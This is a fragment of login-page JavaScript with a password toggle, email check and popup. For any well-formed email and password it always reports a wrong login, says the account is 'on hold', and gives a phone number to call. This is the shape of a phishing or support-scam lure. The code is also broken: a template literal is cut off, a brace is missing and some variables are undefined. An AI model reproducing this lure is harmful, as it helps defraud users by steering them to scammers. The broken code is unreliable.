    <script>
        var crossButton = document.getElementById('crossButtonMenu');
        var menuScreen = document.getElementById('sidebarMenu');

        var username = document.getElementById('username');

        var popupBox = document.getElementById('popupBox');
        var popupBoxMsg = document.getElementById('popupBoxMsg');
        var formWrapperInputDetailsPass = document.getElementById('formWrapperInputDetailsPass');
        var passwordField = document.getElementById('passwordField');
        var btnLoginQR = document.getElementById('btnLoginQR');
        var eyeIconToggle = document.getElementById('eyeIconToggle');
        var checkValue = document.getElementById('checkValue');

        var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;

        eyeIconToggle.addEventListener('click', function() {
            if (eyeIconToggle.classList.contains('bi-eye-slash-fill')) {

                eyeIconToggle.innerHTML = `<path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5

                eyeIconToggle.classList.add('bi-eye-fill');
                eyeIconToggle.classList.remove('bi-eye-slash-fill');
                passwordField.setAttribute('type', 'text');
            } else {
                eyeIconToggle.innerHTML = `<path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z "/>
  <path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z "/>`;
                eyeIconToggle.classList.add('bi-eye-slash-fill');
                eyeIconToggle.classList.remove('bi-eye-fill');
                passwordField.setAttribute('type', 'password');
            }
        });

        click_login_submit.addEventListener('click', function() {
            if (username.value == '' && passwordField.value == '') {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill email id and password';
            } else if (username.value == '') {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill email';
            } else if (!username.value.match(validRegex)) {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill valid email';
            } else if (passwordField.value == '') {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'please fill Password';
            } else {
                popupBox.style.display = 'flex';
                popupBoxMsg.innerText = 'You have entered wrong email id or password. \n For security reasons Your account has been put on hold until you get in touch with us. \n To get in touch with the customer relationship manager, call(888) 221-4080.';

        });

        popupBoxClose.addEventListener('click', function() {
            popupBox.style.display = 'none';
            popupBoxMsg.innerText = '';
        })
